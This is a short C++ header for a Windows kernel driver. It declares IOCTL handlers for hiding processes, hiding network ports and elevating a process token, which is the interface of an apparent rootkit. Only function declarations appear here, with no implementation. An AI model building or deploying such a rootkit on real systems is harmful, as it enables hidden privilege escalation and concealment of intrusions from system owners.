#pragma once
#include <Ntifs.h>

namespace IoctlHandlers {

	NTSTATUS HideProcess(PIRP Irp);

	//NTSTATUS TestConnection(PIRP Irp, ULONG bufferSize);

	NTSTATUS ElevateToken(PIRP Irp);

	NTSTATUS HidePort(PIRP Irp);
}